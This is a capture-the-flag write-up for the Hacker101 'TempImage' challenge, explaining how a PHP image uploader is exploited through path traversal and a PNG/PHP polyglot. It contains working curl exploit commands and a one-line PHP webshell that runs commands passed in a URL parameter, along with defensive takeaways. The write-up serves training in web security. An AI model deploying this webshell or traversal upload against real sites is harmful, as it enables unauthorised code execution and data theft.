# TempImage

**Platform:** HackerOne CTF 101
**Challenge:** TempImage
**Difficulty:** Moderate
**Category:** Web
**Flags:** 2

---

## Overview

TempImage is an image hosting service letting users upload PNG files. The service stores uploaded files in a `/files/` directory with an MD5-based prefix. The application uses a client-side JavaScript snippet to populate a hidden `filename` field, but the server blindly trusts this value. This leads to path traversal (Flag 0) and arbitrary code execution (Flag 1).

**Hints provided:**
- Flag 0: "File uploads can be hard to pin down"
- Flag 1: (no hints)

**Server:** openresty/1.29.2.4, PHP/5.5.9-1ubuntu4.29

---

## Reconnaissance

### Application Behavior

The application consists of a single-page site with one feature: image upload.

| Page/Endpoint | Method | Purpose |
|---------------|--------|---------|
| `/` | GET | Landing page, link to upload |
| `/upload.php` | GET | Upload form with file input |
| `/doUpload.php` | POST | Processes uploads |
| `/files/{hash}_{name}` | GET | Serves uploaded files |

### Key Findings

1. **Client-controlled filename:** The `upload.php` form has a hidden `filename` input populated by JavaScript from the original filename. Since it's client-side, the server cannot trust this value — and it does.

2. **Hash prepended to filename:** Uploaded files are stored as `files/{md5(filename)}_{filename}`. The hash is deterministic (`md5`), making file locations predictable.

3. **PNG-only gate (bypassable):** `getimagesize()` is used to validate PNG format, but it only checks the header bytes (`\x89PNG\r\n\x1a\n`). Content after the header is ignored.

4. **PHP execution in web root:** PHP files execute when placed in the web root (`/app/`), but not in `/files/`.

5. **Full source code disclosure:** PHP error messages reveal line numbers, function calls, and file paths. The complete `doUpload.php` source was recovered via RCE.

### doUpload.php (Full Source)

```php
<?php
    $is = getimagesize($_FILES['file']['tmp_name']);
    if($is === false || $is[2] != 3)
        echo 'ERROR: Only PNG format supported in trial.';
    else {
        $of = 'files/' . md5($_POST['filename']) . '_' . $_POST['filename'];
        if(move_uploaded_file($_FILES['file']['tmp_name'], $of))
            header('Location: ' . $of);
        else
            echo 'ERROR: Upload failed';
    }
    if(strpos($_POST['filename'], '../') !== false)
        echo '<br>^FLAG^...$FLAG$';
?>
```

---

## Flag 0 — Information Disclosure via Path Traversal Error

**Method:** Trigger `strpos('../')` check by uploading with `../` in filename

### Vulnerability

The `doUpload.php` script performs a naive check for `../` in the filename:

```php
if(strpos($_POST['filename'], '../') !== false)
    echo '<br>^FLAG^...$FLAG$';
```

This check was intentionally left in the code to reward testers who try path traversal. Any upload attempt with `../` in the filename causes the flag to be echoed in the HTML response.

### Exploit

```bash
curl -s "$URL/doUpload.php" \
  -F "file=@valid.png;type=image/png" \
  -F "filename=../flag0.png"
```

> **Flag 0:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** Never leave debug code in production. The `strpos` check and echo statement are clearly debugging artifacts that directly leak sensitive information.

---

## Flag 1 — RCE via PNG Polyglot + Path Traversal

**Method:** Upload PHP webshell disguised as PNG using path traversal to web root, then read `index.php`

### Vulnerability

Two issues combine for RCE:

1. **PNG validation is header-only:** The `getimagesize()` function only checks the first bytes for PNG magic. Appending PHP code after `\x89PNG\r\n\x1a\n` passes validation while containing executable PHP.

2. **Path traversal via `/../../`:** By setting `filename=/../../shell.php`, the generated path becomes:
   ```
   files/{md5("/../../shell.php")}_/../../shell.php
   ```
   PHP's `move_uploaded_file()` normalizes this to `shell.php` in the web root (`/app/`), where PHP execution is enabled.

### Exploit

**Step 1:** Create PNG+PHP polyglot:

```python
php_code = b'<?php if(isset($_GET["c"])){system($_GET["c"]);} __halt_compiler(); ?>'
payload = b'\x89PNG\r\n\x1a\n' + php_code
```

**Step 2:** Upload with path traversal:

```bash
curl -s "$URL/doUpload.php" \
  -F "file=@shell.png;type=image/png" \
  -F "filename=/../../x.php"
```

**Step 3:** Execute commands via webshell:

```bash
curl -s "$URL/x.php?c=cat%20/app/index.php"
```

The flag is hidden as a PHP comment in `index.php`:

```php
<?php /* ^FLAG^<redacted>$FLAG$ */ ?>
```

> **Flag 1:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** Content-type validation must inspect the entire file, not just headers. Path construction should use `basename()` to strip directory components. Store uploads outside the web root or disable script execution in upload directories.

---

## Complete Flag List

| Flag | Hex | Technique |
|:----:|-----|-----------|
| 0 | `<redacted>` | Path traversal triggers debug flag echo |
| 1 | `<redacted>` | PNG polyglot RCE → read index.php |

---

## Key Takeaways

1. **Client-side input is untrusted:** The hidden `filename` field set by JavaScript was trivially manipulated. Never trust client-supplied data.

2. **Debug code leaks information:** The intentional `strpos` check leaking Flag 0 mirrors real-world scenarios where developers leave debug output in production.

3. **Content-type checks are often shallow:** `getimagesize()` only validates file headers. A proper implementation would re-encode the image (`imagecreatefrompng` + `imagepng`) to strip embedded code.

4. **Path traversal in `move_uploaded_file()`:** PHP's `move_uploaded_file()` does not sanitize paths. Always use `basename()` on user-supplied filenames: `$filename = basename($_POST['filename']);`

5. **Upload directories should not execute code:** Store user uploads outside the document root or configure the web server to serve them as static assets only.

---

## Files

| File | Description |
|------|-------------|
| `solve.py` | Complete PoC — automates both flag captures |

## Usage

```bash
pip install requests
python3 solve.py https://<instance-id>.ctf.hacker101.com/
```

---

## References

- [Hacker101 CTF Platform](https://ctf.hacker101.com/)
- [AlliumSec TempImage Writeup](https://alliumsec.com/tempimage/)
